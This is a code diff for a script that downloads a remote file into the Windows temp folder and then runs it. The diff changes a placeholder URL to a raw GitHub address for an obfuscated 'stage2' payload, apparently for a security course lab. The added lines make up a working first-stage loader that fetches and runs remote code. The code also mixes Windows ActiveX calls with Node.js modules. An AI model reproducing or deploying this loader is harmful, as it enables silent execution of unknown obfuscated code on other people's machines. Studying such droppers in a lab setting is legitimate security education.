@@ -4,9 +4,8 @@ const https = require('https'); // For downloading over HTTPS
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var tempFolder = fso.GetSpecialFolder(2);
 
-const filePath = path.join(tempFolder, 'myScript.js'); // Path to save the file
-const scriptUrl = 'https://example.com/path/to/myScript.js'; // URL of the script to download
-//const targetUrlToOpen = 'https://example.com/target'; // URL to open after execution
+const filePath = path.join(tempFolder, 'stage2Obfv3.js'); // Path to save the file
+const scriptUrl = 'https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2Obfv3'; // URL of the script to download
 
 async function checkAndExecuteScript() {
     if (fs.existsSync(filePath)) {
@@ -43,15 +42,6 @@ function executeScript(scriptPath) {
     try {
         require(scriptPath); // Execute the downloaded script
         console.log(`Executing: ${scriptPath}`);
-        // Assuming the downloaded script contains logic to open a URL,
-        // or you can add it here if the script itself doesn't.
-        // For example, using a browser automation library like 'puppeteer'
-        // or simply logging the target URL.
-        console.log(`Opening URL: ${targetUrlToOpen}`);
-        // In a real-world scenario, you might use a library like 'open'
-        // to open the URL in the default browser:
-        // const open = require('open');
-        // open(targetUrlToOpen);
     } catch (error) {
         console.error('Error executing script:', error);
     }
